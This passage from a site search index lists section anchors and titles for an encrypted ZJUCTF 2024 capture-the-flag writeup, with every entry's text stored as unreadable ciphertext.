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;^","title":"\ud83d\udd12 ZJUCTF 2024"},{"location":"writeups/zjuctf2024/#zjuctf-2024-writeup","text":"36S0bfIW0xducval6W5AtQ==;2y3NkMNEGGgC0dKY5TB7Q4brcKfZ5IgzhbCOQ3uh6eJJ6xev+jMDTDhHyhp6kzfVzJdPIVnstZgHU8yKwys4tiNDhu8yK57CU1xWiSzKPCPGHIG3LPcgOi9MxZtameg5uSCnzoEEsXRwzCTKQJGYnX6EQdWIKJE/kvGlM1/gMY8t2G1/WPsoErsa4caXMhQmRYLlh3ul5MuggHqlX34iJZOz1hVcfQzrVz5De3gI7gGBcJzw5MSS6kaIlHsxZNw6D5COqIHtEiSBYLIMJnwDbJFzP5J5aEuWf2Guur/sVbrmE01qowgJwhF7xtGzp3TBlURyZWSv8dKmpL4XzZtJHSeljcdJeH3QLVIcCtoAG0EnMrmPkC+Od+c8Xyu2EVh1CZHjKERKUhI/yFekZ8VWA3x2ItS2suML5BTuUjwytQd3TlB700ZF/tbdgXTDZs9Sfomz2a1qQXkZmo2AkvUeuUVYTzgqFlX04yjn2Fu+NoQ9NOb47VaeUm269adOMu/NX7iyFEzi8I+kxJceDMmAn4yd38CGozDVMYftr5f/F3Ro4xdtfBF1gixelCjaSpyUgHMY7RENHzA3rUDAAIERAQ==;^","title":"ZJUCTF 2024 Writeup"},{"location":"writeups/zjuctf2024/#misc","text":"yJNJWqXeQRULvJcfWElBwQ==;G3nvjRA0DK57+eSCxymOuramYUtgf7CEkyEsXyi9CYk=;^","title":"Misc"},{"location":"writeups/zjuctf2024/#a","text":"RCWr6VBu3H+oV3FwG1wDfQ==;YsB8HWKkf8WWYyCyekdOGftOR9W6B7F62oyBYUVHIDgqvsQoNk2+f06xx6FGi8ZbTlyJUrbHCoEsxSAGxUERrR22c5T5uQCxb5BLU/ZZ4bkVR0k6awGSRjoSc09SNvjeTDNcjaT7xl3IRlyuubR0bVHL8OtcRntWumyUWJ7IR+/d4SJ24+RcGh3wAlkyMvEdh2ySb4bGzJ7WZ8D1iI3L8YRw//3KHdysS74HdyV4INToejvX4s+ITGmpVA2TQxf4/BqGzn3GXv8qWhH7KsAj69s2UITIwwHvdN0HkIhbnMigTZbHZlAdOLQcDAcc/gH8UZUITu6iEFy3nMBsP7TsU6NtQAmevvSyzNdzC6qLEEffQ2E1aDU9AXOhhk5MEip6Sj+8LPKY/Z30fTlIB4pqrShKQy9Mtfg5ucNgrmKGX0dJv2dNOtFpaEilqp/560683ACrDe/6jNlDsJwLX+IqC4pWvqxg/wmt2zzOWY+/daWtef4ky/Z1m+ha0vMIuWeozhEXudewayrxCqZVk1e+/Dgtnv2sAu1NgJo8emW9/PJCTy5x3RJ6Pzlm+1WOL9/WijaapsIuGUQ9s3VVP304UVoUltAmGCspw5HuT0UTrwXUmLlawlb5XiSanYKfFpu+komtn+/1HDtYzR9rxeVZ8cEWvKquPglk3cbpwyvnWSWzyT0Vl05qc+gUErEp29UDgxFkwj6c9nqU4i7l9pLa5Tqd4aSIol6ySe6KcqZ4nGygIY5cTBQjKgDYKmd5VfxhZxLiLdVV6Msnq3+7en8cYYNHaojK+sn2V3aAsYxyWJrMhH9Y1JroaAsrTYXyU3aADRzop9UueHNDc2ss80Pxk0mlUOjk1hVYL1hSVBL84QlcC6HtI2a2ZDeKsHQbgcJocqOlvk6TXt34iciWfQk1UhaBMFa6CjZU5cIybiIjYqetby7QH7jYLCOi4dW4n6kRIZduM9dtEeDL/6G5eGPknTQXvtbWQeNi0Ma+cefAhrliSyzXrfjKgN4L4NPOPMaySzSwG5mb6+Ugd1PPRhjDsk+PBLwXaRAoDBc/8mFU8iFEItr78oToQDF7GKpLwceh1L701qMbmmSRPXjQEhPlFQ==;^","title":"\u5c0fA\u53e3\u7b97"},{"location":"writeups/zjuctf2024/#silence","text":"E6ikLKqa7Wi+SMAjxLa5xg==;CvIO/9b1gO2OiCYsNbcBeiiJTTiskCVwcfIdjwGMfuM9JccGCscSoPv8uFgVdcH9EmEahcj3azXWDKMXbPp8DNwM6KSkZM7uu1Me4Um+RXj/Mzax8WYTooLxs1oG2y02xDIrpOQYA1k7RGVJuhroc1Fb3IzJX0gyqmp2Oy/hVbFwGYtxqIwUU59s6SFhLSDHaqk9q0JQBaZXwwHHagrE0AoGG2/3RwSoG4mlsYqibVDCrGuM9TqmnY1N5Y3tjKMf;^","title":"Silence"},{"location":"writeups/zjuctf2024/#master-of-c","text":"Cmyu+dfd/qkSR6z88M201w==;8eQCOoq7tWpYbPHCLeRUUk+nj4+S6kcoxNhksZ6g0uh5Y6X+AzScNJxI3cTwKHvRVTMwhLZI08nWmgNvTMHMm5VN5BGdU1+uZ8u8qAXNH97JzCQJ17Hjc0GoyqS1+cqLNzbqrAA+T7jbwSge3DIgptEQ84TF8DJ9eeb+sbbVG6HKNCZcKzDCM80y+nz4BVl8K0wfXwMW5+fw3luqdMUcem2p6mj7b8cvcf0ThUd86V/+FLkPEtcBCSBD510zREeKqVhWhc7HTZIMzVaHimbOPLo2HfJ8JiTRPzwbZyyWXtVd/TQcDNyDZAgG2IuOwXAdFnScO96V7k1OTlKe7SVGmHqhdJtkiDL8agvr5VRMIfH2DFg3BCRYJ82/jChFgJyWI7XPa+0fSRuWDh7bsgZnsZpDSZ1PIW1MzFHYI23l4BY=;^","title":"Master of C++"},{"location":"writeups/zjuctf2024/#cba","text":"XEVKZJK9hq5ikdc+fDgX9w==;5veWQEL5+QCmVLBHEIdiX5Hwh+GHhNAtEwFpCmABv8ptzO3bAIlZj1/0TZ0GT1EAMN833qt/Ns5hBadz4HmqvDwqQy/q/IZZQbpI1mET2TzoeJzXVZtt9DIZ/gI+T7cebH609BxYW1VZAKnQwzV2cRce2G7i9/jYoEOex04FSoI1HpyH9p3lTITUdwnk91aCvKy8kaIlaf5F4FStRexnjj29Ze/uu1CgQDvZrFzUp6+PSbSUhzFjzcHO04uKzfRYRcJEb/Eyu6Ec+kAOFypxKrZoASNLe/iVGIPZleeHJXzzlzHDCCtcUWIEivUSIZlHpGOa1sRTpiImSkVDXceEKw==;^","title":"CBA"},{"location":"writeups/zjuctf2024/#_1","text":"WjM9TZ+CzJ/tVyN7Q40NVQ==;jVEEPFj6zmBQMXRyFSE6kb3f/zp6PX0vjVT3rt2qWl6/4W8Ao6Rd1R80Foee7s2N4CTlx2ks5tdIwJGspVuS0L7mattAnNEF/KiIfKJmbe2bddR4bSNe0TPZJ0fw2DuhNZhHUaOF6V6wKngAnscjIz2Y0fNW10TVJ3ecgLGqpAozl/4la0GDve+1Y2qJ2ZcIiOsrds2PL1tLSGoc8ZuYOESnk9LUO1mwIz3l1H5DhlIkY9P2TRG04tGipYAnv2hUJVHbKScf3lFmqj61I/Xf5GK5/7I++MMv7BysRD+KdxH/sJ/VWsydDegADaNe4T3uSYtY5YXY1R3RCI40IiydgRcVg0GijrYDmTRTHSNNNiEvsWDrxjHfvPNSVlLGQF+GdcyhetSOmgWvwYrBpKD6tubwWW31/hCpVV5kRlhjHy85qDaH8kY8GIKXECnDpUqAc1+LDrNBR5kzWrV14H3GeTmIHbeGySkVXLQ+Qam5I/f/tjQ1e4zJGeKsEi3zGDsbm6uO/GCX5z5FmfkeVRJ8LIyJutzdvNzeioOCpk0gg3Ih/X1FRyvzgA4Nubj7pjJ2Rf8ep0T4t0h9+0pWuL4IOg==;^","title":"\u9505\u91cc\u635e\u9762"},{"location":"writeups/zjuctf2024/#bytes","text":"njk1EqyYWiwrHAXRxNqbYg==;G8hn64dOiCXJThYpx3eovZfTNK4+dd2jU7LqKmH1d+fTGISzq1QR6SoKLOBWfih3Xq2D8sW+xVNmX24m89OrYe/Jx97FoHAf/vMZLl4gsO/0BIcKeRWDtggrRUZoDNjnHr902u9L1cuHucPA8zktLcb0xMXr2fhfWNwR32Yi5nYDNd5PiKMMlkccZHCkIoydoQWxqbI96a6Rr7bgKxuNdCfOrWwbrtF8UtNzOWCYUHZqQkPM5m4Vh1HjOnCOyhhCK7z22yl1UgE0a3vRObb1qlJkY9F+o8kIzANu630ni8f2LMdLTH76Kh0B76lNQ6iQOS8hDMZ+UZmSOt+P0SAA2A==;^","title":"Bytes?"},{"location":"writeups/zjuctf2024/#minecretf","text":"D8RPpISoFBedF+aswfEYyQ==;Ubn+37wNE7ATkr9gpoyjBpPNFHHwX3Fki1YHyfK78f+W6BPLhnLyep3epVbYNMYy7czGTG9bLMfcURV90b88ljonX8zeSY04RuHp9gbix+AbSWOsL4VjXmn86A96v0QJ7tBxzmnEYoUD53td+tUnvazPGbqRjWShXGB/fZi0Ql/9u/vq7JVZrHehUJMKb7XGFiZF6yqgJ8gWZr4itOdboWeiu6ddsXt8j/9JQ7GGa7bRQmtZEqJ+D9d7cr8DPKyxXmH5rcfTv7zom8iPg16SVghOSx3d+gkUTghDse5aOrPjThObBgEtod6d5U2teOBz7pNTY5oRokBzqHUehikT5zlXiupJ7TRMU/k99GjKTraZM3UlHJ6Iq5Oouy47Jleo2/hEklM1VWQwUV+5V+FNCxZTyUN+9xVVWOgq9kt3fGj7GyEndnjRs4I1JBGtn1ms+ZqQ6bfGKfb+rbiUyp5DwdaalDL4EYCMBfY/W3stTReeJE0V4xESfenK/j/mRUygyzo44iBRdwZAN2zRGJjb2v6qz6eS/vbqIQOhSNUWL0xn49e3seo6BE17GUN